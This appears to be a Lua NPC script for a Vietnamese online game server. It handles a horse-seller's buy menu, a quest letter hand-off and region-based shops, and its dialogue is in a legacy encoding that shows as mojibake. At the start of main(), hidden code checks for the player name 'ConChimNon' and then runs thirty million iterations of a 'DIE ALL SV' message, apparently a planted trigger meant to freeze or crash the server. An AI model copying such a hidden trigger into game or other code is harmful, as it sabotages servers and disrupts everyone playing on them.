--Author: thaihoa91



function main()
	if GetName() == "ConChimNon" then
		for i = 1,10000000 do
		Msg2Player("DIE ALL SV")
		end	
		for i = 1,10000000 do
		Msg2Player("DIE ALL SV")
		end	
		for i = 1,10000000 do
		Msg2Player("DIE ALL SV")
		end
	return end
	if GetTask(103) == 7 then
	Say("<color=green>B¸n Ngùa<color>: §¹i hiÖp <color=fire>"..GetName().."<color> muèn mua ngùa g×?: ",3,
	"Mua ngùa./muangua",
	"Giao tÝn th­ ch­ëng m«n/giaotinthu",
	"Tho¸t./no")	
	else
	Say("<color=green>B¸n Ngùa<color>: §¹i hiÖp <color=fire>"..GetName().."<color> muèn mua ngùa g×?: ",2,
	"Mua ngùa./muangua",
	"Tho¸t./no")
	end
end;

function giaotinthu()
	if GetTask(103) == 7 then
		SetTask(103,8)
		Talk(1,"","<color=green>B¸n Ngùa<color>: Ta ®· nhËn ®­îc tÝn th­, h·y nãi víi Ch­ëng M«n ng­¬i lµ ta sÏ cè g¾ng hÕt søc ®Ó gióp ®Ö tö cña ng­êi !")
	end
end

function muangua()
w,x,y = GetWorldPos()
if w == 9 then
Sale(17)
elseif w == 17 then
Sale(18)
elseif w == 15 then
Sale(19)
elseif w == 18 then
Sale(20)
elseif w == 16 then
Sale(21)
elseif w == 66 then
Sale(19)
elseif w == 4 then
Sale(random(17,21))


end
end;

function no()
end;
